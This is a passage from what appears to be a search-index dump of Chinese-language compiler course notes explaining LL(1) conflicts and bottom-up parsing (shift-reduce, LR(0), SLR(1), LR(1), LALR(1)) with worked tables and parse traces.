<li>\u5982\u679c\u5728\u67e5\u8868\u65f6\u53d1\u73b0\u7a7a\u7684\u8868\u9879\uff0c\u5219\u8f93\u5165\u4e2d\u5305\u542b\u8bed\u6cd5\u9519\u8bef</li> </ul> \u4e0d\u662f LL(1) \u6587\u6cd5\u7684\u4f8b\u5b50 <p>\u5bf9\u4e8e\u6587\u6cd5\uff1a\\(Z\\to d\\ |\\ X\\ Y\\ Z\\)\uff0c\\(Y\\to c\\ |\\ \\varepsilon\\)\uff0c\\(X\\to Y\\ |\\ a\\)\uff1a</p> Nullable First Follow \\(Z\\) False \\(\\{d, a, c\\}\\) \\(\\{\\}\\) \\(Y\\) True \\(\\{c\\}\\) \\(\\{d, a, c\\}\\) \\(X\\) True \\(\\{a, c\\}\\) \\(\\{c, d, a\\}\\) <p>\u6784\u9020\u9884\u6d4b\u5206\u6790\u8868\uff1a</p> \\(a\\) \\(c\\) \\(d\\) \\(Z\\) \\(Z\\to X\\ Y\\ Z\\) \\(Z\\to X\\ Y\\ Z\\) \\(Z\\to X\\ Y\\ Z\\)\\(Z\\to d\\) \\(Y\\) \\(Y\\to \\varepsilon\\) \\(Y\\to c\\)\\(Y\\to\\varepsilon\\) \\(Y\\to \\varepsilon\\) \\(X\\) \\(X\\to a\\)\\(X\\to Y\\) \\(X\\to Y\\) \\(X\\to Y\\) <p>\u56e0\u4e3a\u6709\u4e09\u4e2a\u8868\u9879\u4e2d\u5305\u542b\u4e86\u4e24\u4e2a\u4ea7\u751f\u5f0f\uff0c\u6240\u4ee5\u4e0d\u662f LL(1) \u6587\u6cd5\u3002</p> </li> </ul> </li> <li> <p>LL(1) \u6587\u6cd5\u7684\u6027\u8d28\uff1a\u65e0\u4e8c\u4e49\u3001\u65e0\u5de6\u9012\u5f52\u3001\u65e0\u5de6\u516c\u56e0\u5b50</p> <ul> <li>\u5de6\u9012\u5f52\uff1a\u5b58\u5728\u975e\u7ec8\u7ed3\u7b26 \\(A\\) \u4f7f\u5f97 \\(A\\Rightarrow^+A\\alpha\\)<ul> <li>\u76f4\u63a5\u5de6\u9012\u5f52\uff1a\\(A\\to A\\alpha\\ |\\ \\beta\\) \u5176\u4e2d \\(\\alpha\\neq\\varepsilon\\) \u4e14 \\(\\alpha, \\beta\\) \u4e0d\u4ee5 \\(A\\) \u5f00\u5934</li> <li>\u6d88\u9664\u76f4\u63a5\u5de6\u9012\u5f52\uff1a\u6539\u4e3a \\(A\\to\\beta A'\\)\uff0c\\(A'\\to\\alpha A'\\ |\\ \\varepsilon\\)\uff08\u8f6c\u4e3a\u53f3\u9012\u5f52\uff09</li> </ul> </li> <li>\u5de6\u516c\u56e0\u5b50\uff1a\\(A\\to\\alpha\\beta\\ |\\ \\alpha\\gamma\\) \u5176\u4e2d \\(\\alpha\\) \u662f\u516c\u5171\u524d\u7f00<ul> <li>\u63d0\u5de6\u516c\u56e0\u5b50\uff1a\u6539\u4e3a \\(A\\to\\alpha A'\\)\uff0c\\(A'\\to\\beta\\ |\\ \\gamma\\)\uff08\u63a8\u8fdf\u51b3\u5b9a\uff09</li> </ul> </li> </ul> </li> <li>LL(1) \u5206\u6790\u7684\u6709\u70b9\uff1a\u8fd0\u884c\u9ad8\u6548\uff08\u7ebf\u6027\u65f6\u95f4\uff09\uff0c\u9002\u5408\u624b\u52a8\u6784\u9020\u548c\u81ea\u52a8\u751f\u6210</li> <li>LL(1) \u5206\u6790\u7684\u5c40\u9650\u6027\uff1a\u80fd\u5206\u6790\u7684\u6587\u6cd5\u7c7b\u578b\u53d7\u9650</li> </ul>"},{"location":"cs/pl/compiler/topic1/#_7","title":"\u81ea\u5e95\u5411\u4e0a\u5206\u6790","text":"<ul> <li>\u57fa\u4e8e LR(k) \u6587\u6cd5\u8fdb\u884c\u5206\u6790<ul> <li>L\uff08Left-to-right\uff09\uff1a\u4ece\u5de6\u5230\u53f3\u626b\u63cf</li> <li>R\uff08Rightmost derivation in reverse\uff09\uff1a\u6700\u53f3\u63a8\u5bfc\u7684\u9006\uff08\u6700\u5de6\u89c4\u7ea6\uff09</li> <li>k\uff1a\u5411\u524d\u770b k \u4e2a Token \u6765\u786e\u5b9a\u89c4\u7ea6\uff08\u7701\u7565\u65f6\u9ed8\u8ba4\u4e3a 1\uff09</li> <li>\u6709 LR(0)\u3001SLR(1)\u3001LR(1)\u3001LALR(1) \u7b49\u7c7b\u578b<ul> <li>LR(0) &lt; SLR(1) &lt; LALR(1) &lt; LR(1)</li> </ul> </li> <li>\u6240\u6709 LL(k) \u6587\u6cd5\u90fd\u662f LR(k) \u6587\u6cd5</li> <li>LR \u4e0d\u9700\u8981\u63d0\u5de6\u516c\u56e0\u5b50\uff0c\u800c\u4e14\u53ef\u4ee5\u5206\u6790\u5de6\u9012\u5f52\u6587\u6cd5</li> </ul> </li> <li>\u81ea\u5e95\u5411\u4e0a\u5206\u6790\u7684\u601d\u8def\u662f\u4ece\u8f93\u5165\u4e32\u89c4\u7ea6\u5230\u5f00\u59cb\u7b26\u53f7<ul> <li>\u4e00\u4e2a\u4e0e\u67d0\u4ea7\u751f\u5f0f\u4f53\u76f8\u5339\u914d\u7684\u7279\u5b9a\u5b57\u4e32\u53ef\u4ee5\u66ff\u6362\u4e3a\u8be5\u4ea7\u751f\u5f0f\u5934\u7684\u975e\u7ec8\u7ed3\u7b26</li> <li>\u95ee\u9898\u5728\u4e8e\u4f55\u65f6\u8fdb\u884c\u89c4\u7ea6\u4ee5\u53ca\u786e\u5b9a\u89c4\u7ea6\u5230\u54ea\u4e2a\u975e\u7ec8\u7ed3\u7b26</li> </ul> </li> </ul>"},{"location":"cs/pl/compiler/topic1/#shift-reduce","title":"Shift-Reduce","text":"<ul> <li>\u79fb\u8fdb-\u89c4\u7ea6\u5206\u6790</li> <li>\u601d\u60f3\u662f\u5c06\u8f93\u5165\u4e32\u5206\u4e3a\u4e24\u4e2a\u5b50\u4e32<ul> <li>\u53f3\u5b50\u4e32\u662f\u8fd8\u6ca1\u6709\u5206\u6790\u8fc7\u7684\u90e8\u5206\uff0c\u5305\u542b\u4e00\u7cfb\u5217\u7ec8\u7ed3\u7b26</li> <li>\u5de6\u5b50\u4e32\u5305\u542b\u7ec8\u7ed3\u7b26\u548c\u975e\u7ec8\u7ed3\u7b26</li> <li>\u8d77\u59cb\u72b6\u6001\u6574\u4e2a\u4e32\u90fd\u5c5e\u4e8e\u53f3\u5b50\u4e32</li> </ul> </li> </ul> Shift-Reduce \u5206\u6790\u4f8b\u5b50 <p>\u5bf9\u4e8e\u6587\u6cd5 \\(E\\to E+(E)\\ |\\ \\mathsf{int}\\) \u5206\u6790\u4e32 int + (int) + (int)\uff0c\u5229\u7528 | \u6765\u5206\u5272\u4e24\u4e2a\u90e8\u5206</p> <pre><code>| int + (int) + (int)$      \u521d\u59cb\u72b6\u6001\nint | + (int) + (int)$      \u79fb\u8fdb int\uff0c\u5339\u914d\u5230\u89c4\u5219 E -&gt; int\nE | + (int) + (int)$        \u89c4\u7ea6 E -&gt; int\nE + (int |) + (int)$        \u79fb\u8fdb\u4e09\u6b21\nE + (E |) + (int)$          \u89c4\u7ea6 E -&gt; int\nE + (E) | + (int)$          \u79fb\u8fdb\u4e00\u6b21\nE | + (int)$                \u89c4\u7ea6 E -&gt; E + (E)\nE + (int |)$                \u79fb\u8fdb\u4e09\u6b21\nE + (E |)$                  \u89c4\u7ea6 E -&gt; int\nE + (E) |$                  \u79fb\u8fdb\u4e00\u6b21\nE |$                        \u89c4\u7ea6 E -&gt; E + (E)\uff0c\u7ed3\u675f\n</code></pre> <ul> <li>\u4ece Shift-Reduce \u53ef\u89c1 LR \u8fdb\u884c\u7684\u662f\u6700\u53f3\u63a8\u5bfc\u7684\u9006\u8fc7\u7a0b<ul> <li>\u6700\u53f3\u63a8\u5bfc\u4e2d\u51fa\u73b0\u7684\u53e5\u578b\u79f0\u4e3a\u6700\u53f3\u53e5\u578b</li> </ul> </li> <li>LR \u5206\u6790\u7684\u4e00\u822c\u6a21\u5f0f\uff1a\u57fa\u4e8e\u6808\u7684 Shift-Reduce<ul> <li>\u4fdd\u5b58\u4e24\u4e2a\u90e8\u5206\uff0c\u4e00\u4e2a\u6808\u7528\u6765\u5b58\u50a8\u5de6\u5b50\u4e32\uff0c\u4e00\u4e2a\u8f93\u5165\u7f13\u51b2\u533a\u7528\u6765\u5b58\u50a8\u53f3\u5b50\u4e32</li> <li>\u5305\u62ec\u56db\u4e2a\u64cd\u4f5c\uff1a<ul> <li>Shift\uff1a\u5c06\u4e0b\u4e00\u4e2a\u8f93\u5165\u7684\u7ec8\u7ed3\u7b26\u538b\u5165\u6808\u9876</li> <li>Reduce\uff1a\u5728\u6808\u91cc\u8fdb\u884c\u89c4\u7ea6<ul> <li>\u6808\u9876\u7684\u5e8f\u5217\u9700\u8981\u5339\u914d\u5230\u4e00\u4e2a\u4ea7\u751f\u5f0f\u7684\u53f3\u4fa7\uff0c\u4f8b\u5982 X -&gt; A B C</li> <li>\u4ece\u6808\u4e2d\u5f39\u51fa\u53f3\u4fa7 C B A\uff0c\u538b\u5165\u5de6\u4fa7 X</li> </ul> </li> <li>Error\uff1a\u9047\u5230\u65e0\u6cd5\u8fdb\u884c\u89c4\u7ea6\u7684\u60c5\u51b5</li> <li>Accpet\uff1a\u79fb\u5165\u4e86 $\uff0c\u5e76\u4e14\u6808\u4e0a\u7684\u5269\u4f59\u5185\u5bb9\u53ef\u4ee5\u89c4\u7ea6\u4e3a\u5f00\u59cb\u7b26\u53f7</li> </ul> </li> <li>\u6838\u5fc3\u95ee\u9898\u662f\u4f55\u65f6 Shift \u4f55\u65f6 Reduce</li> </ul> </li> <li>\u6700\u901a\u7528\u7684\u65e0\u56de\u6eaf Shift-Reduce \u5206\u6790\u662f\u8868\u9a71\u52a8\u7684 LR \u5206\u6790<ul> <li>\u6240\u6709\u7684\u5206\u6790\u5668\u90fd\u4f7f\u7528\u76f8\u540c\u7684\u9a71\u52a8\u7a0b\u5e8f\uff0c\u5206\u6790\u8868\u53ef\u4ee5\u6839\u636e\u6587\u6cd5\u81ea\u52a8\u751f\u6210</li> </ul> </li> </ul>"},{"location":"cs/pl/compiler/topic1/#lr0","title":"LR(0) \u5206\u6790","text":"<ul> <li>\u53ef\u4ee5\u7ef4\u62a4\u4e00\u4e2a\u72b6\u6001\u6765\u8bb0\u5f55\u5f53\u524d\u8bc6\u522b\u7684\u8fdb\u5ea6</li> <li>\u4e00\u4e2a\u9879\uff08item\uff09\u662f\u4e00\u4e2a\u4ea7\u751f\u5f0f\u5728\u5176\u4e2d\u67d0\u4e00\u5904\u52a0\u4e00\u4e2a\u70b9<ul> <li>\u6bd4\u5982 \\(A\\to X\\ Y\\) \u53ef\u4ee5\u6709 \\(A\\to\\bullet\\ X\\ Y\\)\u3001\\(A\\to X\\ \\bullet\\ Y\\)\u3001\\(A\\to X\\ Y\\ \\bullet\\) \u4e09\u4e2a\u9879</li> <li>\\(A\\to\\alpha\\bullet\\beta\\) \u8868\u793a\u5df2\u7ecf\u8bc6\u522b\u4e86 \\(\\alpha\\)\uff0c\u63a5\u4e0b\u6765\u8981\u8bc6\u522b \\(\\beta\\)</li> <li>\\(A\\to\\alpha\\beta\\bullet\\) \u8868\u793a\u5df2\u7ecf\u8bc6\u522b\u4e86 \\(\\alpha\\beta\\)\uff0c\u63a5\u4e0b\u6765\u53ef\u4ee5\u89c4\u7ea6\u4e3a \\(A\\)</li> </ul> </li> <li>\u9879\u53ef\u4ee5\u4f5c\u4e3a\u72b6\u6001\uff0c\u5e76\u4e14\u9879\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u8bfb\u5165\u7b26\u53f7\u6765\u8fdb\u884c\u8df3\u8f6c<ul> <li>\u4f8b\u5982 \\(A\\to\\bullet\\ X\\ Y\\) \u53ef\u4ee5\u901a\u8fc7\u8bfb\u5165 \\(X\\) \u8f6c\u79fb\u5230 \\(A\\to X\\ \\bullet\\ Y\\)</li> <li>\u4ea7\u751f\u5f0f\u6709\u9650 + \u4ea7\u751f\u5f0f\u53f3\u8fb9\u957f\u5ea6\u6709\u9650 -&gt; \u9879\u6709\u9650\uff08\u72b6\u6001\u6709\u9650\uff09</li> <li>\u53ef\u4ee5\u6784\u9020\u51fa\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\uff0c\u79f0\u4e3a LR(0) \u81ea\u52a8\u673a<ul> <li>\u8fd9\u4e2a\u81ea\u52a8\u673a\u662f\u7528\u6765\u8bb0\u5f55\u5f53\u524d\u8bc6\u522b\u8fdb\u5ea6\u7684\uff0c\u800c\u975e\u8bc6\u522b LR(0) \u8bed\u8a00\u7684\uff08\u56e0\u4e3a\u81ea\u52a8\u673a\u53ea\u80fd\u8bc6\u522b\u6b63\u5219\u8bed\u8a00\uff09</li> </ul> </li> </ul> </li> <li>LR(0) Parsing NFA<ul> <li>\u9700\u8981\u65b0\u5f00\u59cb\u7b26\u53f7 \\(S'\\)\uff0c\u52a0\u5165\u4ea7\u751f\u5f0f \\(S'\\to S\\$\\) \u65b9\u4fbf\u8868\u793a\u8d77\u59cb\u548c\u7ec8\u7ed3\u72b6\u6001</li> <li>\u72b6\u6001\u8f6c\u79fb<ul> <li>\\(X\\to\\bullet\\ \\alpha\\beta\\) \u5728\u63a5\u6536 \\(\\alpha\\) \u540e\u8f6c\u79fb\u5230 \\(X\\to\\alpha\\bullet\\beta\\)</li> <li>\u5982\u679c\u5b58\u5728 \\(X\\to\\alpha Y\\beta\\) \u4ee5\u53ca \\(Y\\to\\gamma\\)\uff0c\u5219 \\(X\\to\\alpha\\bullet Y\\beta\\) \u53ef\u4ee5 \\(\\varepsilon\\) \u8f6c\u79fb\u5230 \\(Y\\to\\bullet\\ \\gamma\\)</li> </ul> </li> </ul> </li> <li>LR(0) Parsing DFA<ul> <li>\u53ef\u4ee5\u901a\u8fc7\u5b50\u96c6\u6784\u9020\u6cd5\u6765\u5c06 NFA \u8f6c\u4e3a DFA\uff0c\u4f46\u901a\u5e38\u76f4\u63a5\u6784\u9020 DFA</li> <li>\u5047\u8bbe \\(I\\) \u662f\u4e00\u4e2a\u9879\u7684\u96c6\u5408\uff0c\\(X\\) \u662f\u4e00\u4e2a\u7b26\u53f7\uff08\u7ec8\u7ed3\u7b26\u6216\u975e\u7ec8\u7ed3\u7b26\uff09<ul> <li>\\(\\mathsf{Closure}(I)\\) \u4e3a \\(I\\) \u4e2d\u6240\u6709\u9879\u7684\u95ed\u5305\uff0c\u5373\u6240\u6709\u53ef\u4ee5 \\(\\varepsilon\\) \u63a8\u5bfc\u51fa\u7684\u9879<ul> <li>\u5bf9\u4e8e\u4efb\u610f \\(I\\) \u4e2d\u7684 \\(A\\to\\alpha\\bullet X\\beta\\)\uff0c\u5c06 \\(X\\to\\bullet\\ \\gamma\\) \u52a0\u5165 \\(I\\) \u4e2d\uff0c\u76f4\u5230 \\(I\\) \u4e0d\u53d8\u5373\u4e3a\u5176\u95ed\u5305</li> </ul> </li> <li>\\(\\mathsf{Goto}(I, X)\\) \u4e3a \\(I\\) \u4e2d\u6240\u6709\u9879\u7684 \\(X\\) \u8f6c\u79fb\uff0c\u5373\u6240\u6709\u53ef\u4ee5\u8bfb\u5165 \\(X\\) \u8f6c\u79fb\u5230\u7684\u9879<ul> <li>\u5bf9\u4e8e\u4efb\u610f \\(I\\) \u4e2d\u7684 \\(A\\to\\alpha\\bullet X\\beta\\)\uff0c\u5c06 \\(A\\to\\alpha X\\bullet\\beta\\) \u52a0\u5165\u7a7a\u96c6 \\(J\\) \u4e2d</li> <li>\\(\\mathsf{Goto}(I, X)\\) \u5373\u4e3a \\(\\mathsf{Closure}(J)\\)</li> </ul> </li> </ul> </li> <li>\u8d77\u59cb\u72b6\u6001\u4e3a \\(\\mathsf{Closure}(\\{S'\\to\\bullet\\ S\\$\\})\\)</li> <li>\u7ed3\u675f\u72b6\u6001\u4e3a\u5305\u542b \\(S'\\to S\\bullet\\$\\) \u7684\u72b6\u6001</li> <li>\u6784\u9020\u8fc7\u7a0b\u7528 Goto \u4e0d\u65ad\u8ba1\u7b97\u65b0\u72b6\u6001\u5e76\u6dfb\u52a0\u8f6c\u79fb\u8fb9\uff0c\u76f4\u5230\u6ca1\u6709\u65b0\u72b6\u6001\u4ea7\u751f</li> </ul> </li> <li>\u901a\u8fc7 Parsing DFA \u6784\u9020\u8bed\u6cd5\u5206\u6790\u8868<ul> <li>\u9700\u8981\u6784\u5efa\u4e00\u4e2a\u8868\uff0c\u884c\u4e3a\u72b6\u6001\uff0c\u5217\u4e3a\u5bf9\u4e8e\u6bcf\u4e2a\u7ec8\u7ed3\u7b26\u7684 Action \u548c\u5bf9\u4e8e\u6bcf\u4e2a\u975e\u7ec8\u7ed3\u7b26\u7684 GOTO</li> <li>Action \u8868\u4e2d\u7684\u9879\u6709\u4e09\u79cd\u7c7b\u578b\uff1aShift\u3001Reduce\u3001Accept<ul> <li>Shift\uff1a\u72b6\u6001 i \u5728\u63a5\u6536\u7ec8\u7ed3\u7b26 t \u540e\u8f6c\u79fb\u5230\u72b6\u6001 j\uff0c\u5219 Action[i, t] = sj</li> <li>Reduce\uff1a\u72b6\u6001 i \u7684\u7ed3\u5c3e\u662f\u70b9\uff08\u53ef\u4ee5\u8fdb\u884c\u89c4\u7ea6\uff09\uff0c\u5219 Action[i, *] = rk<ul> <li>\u5176\u4e2d k \u662f\u53ef\u4ee5\u8fdb\u884c\u6b64\u89c4\u7ea6\u7684\u4ea7\u751f\u5f0f\u7f16\u53f7</li> </ul> </li> <li>Accept\uff1a\u72b6\u6001 i \u5305\u542b \\(S'\\to S\\bullet\\$\\)\uff0c\u5219 Action[i, $] = accept</li> </ul> </li> <li>GOTO \u8868\uff1a\u72b6\u6001 i \u5728\u63a5\u6536\u975e\u7ec8\u7ed3\u7b26 X \u540e\u8f6c\u79fb\u5230\u72b6\u6001 j\uff0c\u5219 GOTO[i, X] = gj</li> </ul> </li> <li>LR \u8bed\u4e49\u5206\u6790\u7b97\u6cd5<ul> <li>\u6808\u8bb0\u5f55\u7684\u662f LR Parsing DFA \u7684\u72b6\u6001</li> <li>\u56db\u4e2a\u64cd\u4f5c\uff1a<ul> <li>Shift(j) \u5373 sj\uff1a\u5438\u6536\u4e00\u4e2a\u8f93\u5165 token\uff0c\u5c06\u72b6\u6001 j \u538b\u5165\u6808</li> <li>Reduce(k) \u5373 rk\uff1a\u6839\u636e\u4ea7\u751f\u5f0f k \u8fdb\u884c\u89c4\u7ea6<ul> <li>\u5047\u8bbe\u7b2c k \u4e2a\u4ea7\u751f\u5f0f\u4e3a X -&gt; a</li> <li>\u4ece\u6808\u9876\u5f39\u51fa a \u4e2a\u72b6\u6001\uff0c\u5c06\u72b6\u6001 GOTO[top(stack), X] \u538b\u5165\u6808</li> </ul> </li> <li>Accept / Error\uff1a\u7ed3\u675f\u5206\u6790\uff0c\u8fd4\u56de\u6210\u529f\u6216\u62a5\u9519</li> </ul> </li> <li>\u6240\u6709 LR \u5206\u6790\u65b9\u6cd5\u90fd\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u901a\u7528\u7684\u7b97\u6cd5</li> </ul> </li> </ul> \u5b8c\u6574\u7684 LR(0) \u8bed\u6cd5\u5206\u6790\u8fc7\u7a0b\u793a\u4f8b <p>\u5206\u6790\u8f93\u5165 x x y $\uff0c\u8bed\u6cd5\u4e3a\uff1a</p> <pre><code>0: S' -&gt; S $\n1: S -&gt; x S\n2: S -&gt; y\n</code></pre> <p>\u6784\u9020 LR(0) Parsing DFA\uff1a</p> <p>  \u6784\u9020\u8bed\u6cd5\u5206\u6790\u8868\uff1a</p> State \\(x\\) (Action) \\(y\\) (Action) \\(\\$\\) (Action) \\(S\\) (GOTO) 1 s2 s3 g4 2 s2 s3 g5 3 r2 r2 r2 4 accept 5 r1 r1 r1 <p>\u8fdb\u884c\u5206\u6790\uff1a</p> Stack symbols Buffer Action 1 x x y $ shift 2 (push 2) 1 2 x x y $ shift 2 (push 2) 1 2 2 x x y $ shift 3 (push 2) 1 2 2 3 x x y $ reduce 2 (pop 3; push GOTO[2, S]) 1 2 2 5 x x S $ reduce 1 (pop 5,2; push GOTO[2, S]) 1 2 5 x S $ reduce 1 (pop 5,2; push GOTO[1, S]) 1 4 S $ accept <ul> <li>LR(0) \u7684 0\uff1a\u662f\u5426\u89c4\u7ea6\u3001\u9009\u62e9\u54ea\u4e2a\u4ea7\u751f\u5f0f\u8fdb\u884c\u89c4\u7ea6\u4ec5\u7531\u6808\u9876\u72b6\u6001\u51b3\u5b9a<ul> <li>\u5e26\u6709 Reduce \u7684\u540c\u4e00\u884c\u5168\u662f rj</li> </ul> </li> <li>LR(0) \u7684\u5c40\u9650\u6027\uff1a\u5bf9\u4e8e \\(X\\to\\alpha\\bullet\\)\uff0c\u76f4\u63a5\u76f2\u76ee\u8fdb\u884c\u89c4\u7ea6<ul> <li>\u5982\u679c\u5b58\u5728 \\(X\\to Y\\) \u548c \\(X\\to Y\\ Z\\) \u4e24\u6761\u89c4\u5219\uff0c\u5c31\u4f1a\u51fa\u73b0\u51b2\u7a81</li> </ul> </li> </ul>"},{"location":"cs/pl/compiler/topic1/#slr1","title":"SLR(1) \u5206\u6790","text":"<ul> <li>\u5229\u7528\u66f4\u591a\u4fe1\u606f\u6765\u6307\u5bfc\u89c4\u7ea6\u64cd\u4f5c</li> <li>\u201cLR \u5206\u6790\u662f\u6700\u53f3\u63a8\u5bfc\u7684\u9006\u8fc7\u7a0b\u201d<ul> <li>\u6240\u4ee5\u5982\u679c\u8981\u8bd5\u56fe\u89c4\u7ea6 \\(X\\to\\cdots\\)\uff0c\u5219\u9700\u8981\u6ee1\u8db3 \\(t\\in\\mathsf{Follow}(X)\\)\uff0c\u5176\u4e2d \\(t\\) \u4e3a\u4e0b\u4e00\u4e2a token</li> </ul> </li> <li>SLR(1) \u4e0e LR(0) \u7684\u533a\u522b\u4ec5\u5728\u4e8e\u6784\u9020\u8bed\u6cd5\u5206\u6790\u8868\u65f6\u5bf9\u4e8e rj \u9879\u7684\u586b\u5165<ul> <li>LR(0)\uff1a\u72b6\u6001 i \u7684\u7ed3\u5c3e\u662f\u70b9\uff08\u53ef\u4ee5\u8fdb\u884c\u89c4\u7ea6\uff09\uff0c\u5219 Action[i, *] = rk</li> <li>SLR(1)\uff1a\u72b6\u6001 i \u7684\u7ed3\u5c3e\u662f\u70b9\uff08\u53ef\u4ee5\u8fdb\u884c\u89c4\u7ea6\uff09\uff0c\u5219 Action[i, j] = rk<ul> <li>\u5176\u4e2d j \u4e3a \\(\\mathsf{Follow}(X)\\) \u4e2d\u7684\u5168\u90e8\u7ec8\u7ed3\u7b26\uff0c\\(X\\) \u4e3a\u7b2c k \u4e2a\u4ea7\u751f\u5f0f\u5de6\u4fa7\u7684\u975e\u7ec8\u7ed3\u7b26</li> </ul> </li> </ul> </li> </ul> \u65e0\u6cd5\u4f7f\u7528 LR(0) \u53ea\u80fd\u4f7f\u7528 SLR(1) \u7684\u4f8b\u5b50 <p>\u8003\u8651\u5982\u4e0b\u8bed\u6cd5\uff1a</p> <pre><code>0: S -&gt; E $\n1: E -&gt; T + E\n2: E -&gt; T\n3: T -&gt; x\n</code></pre> <p>DFA\uff1a</p> <p>  LR(0) \u7684\u8bed\u6cd5\u5206\u6790\u8868\uff1a</p> State \\(x\\) (Action) \\(+\\) (Action) \\(\\$\\) (Action) \\(E\\) (GOTO) \\(T\\) (GOTO) 1 s5 s3 g2 g3 2 accept 3 r2 s4,r2 r2 4 s5 g6 g3 5 r3 r3 r3 6 r1 r1 r1 <p>\u6b64\u5904\u51fa\u73b0\u4e86 s4 \u548c r2 \u51b2\u7a81\u3002\u4f7f\u7528 SLR(1) \u8981\u8003\u8651 Follow\uff1a</p> <ul> <li>\\(\\mathsf{Follow}(E)=\\{\\$\\}\\)</li> <li>\\(\\mathsf{Follow}(T)=\\{+, \\$\\}\\)</li> </ul> <p>\u636e\u6b64\u6784\u9020 SLR(1) \u7684\u8bed\u6cd5\u5206\u6790\u8868\uff1a</p> State \\(x\\) (Action) \\(+\\) (Action) \\(\\$\\) (Action) \\(E\\) (GOTO) \\(T\\) (GOTO) 1 s5 s3 g2 g3 2 accept 3 s4 r2 4 s5 g6 g3 5 r3 r3 6 r1 <ul> <li>SLR \u89e3\u51b3\u51b2\u7a81\u7684\u65b9\u6cd5\u662f\u5c06\u6309 \\(A\\to \\alpha\\) \u89c4\u7ea6\u7684\u6761\u4ef6\u589e\u52a0\u4e3a\uff1a\u4e0b\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7 \\(x\\) \u53ef\u4ee5\u5728\u67d0\u4e2a\u53e5\u578b\u4e2d\u8ddf\u5728 \\(A\\) \u4e4b\u540e</li> <li>SLR(1) \u7684\u5c40\u9650\u6027\uff1a<ul> <li>\u4ec5\u4f7f\u7528 Follow \u96c6\u8fd8\u662f\u592a\u5f31</li> <li>LR \u5206\u6790\u8fc7\u7a0b\u6bcf\u4e00\u6b65\u90fd\u5e94\u8be5\u662f\u6700\u53f3\u53e5\u578b\uff0c\u800c\u5982\u679c \\(\\beta Ax\\) \u4e0d\u662f\u4efb\u4f55\u6700\u53f3\u53e5\u578b\u7684\u524d\u7f00\uff0c\u5219\u4e0d\u5e94\u8be5\u6309 \\(A\\to \\alpha\\) \u89c4\u7ea6</li> <li>\u6362\u53e5\u8bdd\u8bf4\uff0cFollow \u96c6\u7684\u6761\u4ef6\u6307\u8981\u6c42\u4e86\u53ef\u4ee5\u5728\u67d0\u53e5\u578b\u51fa\u73b0\uff0c\u4f46\u6ca1\u6709\u4fdd\u8bc1\u662f\u6700\u53f3\u53e5\u578b</li> <li>\u6240\u4ee5\u4f7f\u7528 SLR(1) \u4ecd\u7136\u4f1a\u6709\u51b2\u7a81\u7684\u53ef\u80fd\uff0c\u8fd8\u9700\u8981\u8fdb\u4e00\u6b65\u4e25\u683c\u89c4\u7ea6\u7684\u6761\u4ef6</li> </ul> </li> </ul>"},{"location":"cs/pl/compiler/topic1/#lr1","title":"LR(1) \u5206\u6790","text":"<ul> <li>LR(1) \u9879\u4e2d\u5305\u542b\u4e86\u66f4\u591a\u4fe1\u606f\u6765\u6d88\u9664\u4e00\u4e9b\u89c4\u7ea6\u52a8\u4f5c<ul> <li>\u5f62\u5f0f\u4e3a \\(A\\to\\alpha\\ \\bullet\\ \\beta,\\ x\\)\uff0c\u5176\u4e2d \\(x\\) \u4e3a\u5411\u524d\u770b\u7b26\u53f7\uff08\u7ec8\u7ed3\u7b26\u6216 $\uff09<ul> <li>\u8868\u793a\u7b26\u53f7\u6808\u9876\u4e3a \\(\\alpha\\)\uff0c\u5728\u8f93\u5165\u4e32\u5934\u90e8\u662f\u53ef\u4ee5\u4ece \\(\\beta x\\) \u63a8\u5bfc\u51fa\u7684\u4e32</li> </ul> </li> </ul> </li> <li>\u76f8\u8f83 LR(0) \u9700\u8981\u4fee\u6539\u95ed\u5305\u7684\u5b9a\u4e49\uff0c\u589e\u52a0\u6761\u4ef6<ul> <li>LR(0)\uff1a\\(\\mathsf{Closure}(I)\\) \u4e3a\u5bf9\u4e8e\u4efb\u610f \\(I\\) \u4e2d\u7684 \\(A\\to\\alpha\\bullet X\\beta\\)\uff0c\u5c06 \\(X\\to\\bullet\\ \\gamma\\) \u52a0\u5165 \\(I\\) \u4e2d\uff0c\u76f4\u5230 \\(I\\) \u4e0d\u53d8\u5373\u4e3a\u5176\u95ed\u5305</li> <li>LR(1)\uff1a\\(\\mathsf{Closure}(I)\\) \u4e3a\u5bf9\u4e8e\u4efb\u610f \\(I\\) \u4e2d\u7684 \\(A\\to\\alpha\\bullet X\\beta,\\ z\\)\uff0c\u5c06 \\(X\\to\\bullet\\ \\gamma,\\ w\\) \u52a0\u5165 \\(I\\) \u4e2d\uff0c\u76f4\u5230 \\(I\\) \u4e0d\u53d8\u5373\u4e3a\u5176\u95ed\u5305<ul> <li>\u5176\u4e2d \\(w\\in\\mathsf{First}(\\beta z)\\)\uff0c\\(X\\to\\gamma\\) \u662f\u6587\u6cd5\u4e2d\u7684\u4ea7\u751f\u5f0f</li> </ul> </li> <li>\u8d77\u59cb\u72b6\u6001\u4e3a \\(S'\\to\\bullet\\ S\\ \\$,\\ ?\\)\uff0c\u56e0\u4e3a $ \u4e0d\u4f1a\u88ab\u79fb\u8fdb\uff0c\u6240\u4ee5 ? \u662f\u4ec0\u4e48\u65e0\u6240\u8c13</li> </ul> </li> <li>LR(1) \u548c LR(0) \u7684 Goto \u57fa\u672c\u7c7b\u4f3c</li> <li>\u6784\u9020 Action \u8868\u7684\u65f6\u5019\uff0c\u5bf9\u4e8e\u9879 \\(A\\to\\alpha\\beta\\ \\bullet,\\ x\\)\uff0c\u53ea\u6709\u4e0b\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7\u4e3a \\(x\\) \u65f6\u624d\u53ef\u4ee5\u89c4\u7ea6</li> <li>LR(1) \u7684\u5c40\u9650\u6027\uff1a\u5206\u6790\u8868\u4f1a\u6709\u975e\u5e38\u591a\u7684\u72b6\u6001\uff0c\u4f1a\u975e\u5e38\u5927</li> </ul>"},{"location":"cs/pl/compiler/topic1/#lalr1","title":"LALR(1) \u5206\u6790","text":"<ul> <li>LALR(1) \u7528\u6765\u7f29\u51cf LR(1) \u7684\u72b6\u6001\u6570\u91cf</li> <li>LR(1) DFA \u4e2d\u6709\u5f88\u591a\u72b6\u6001\u53ea\u5dee\u4e86\u5411\u524d\u770b\u7b26\u53f7\uff0c\u5176\u5b9e\u53ef\u4ee5\u5408\u5e76</li> 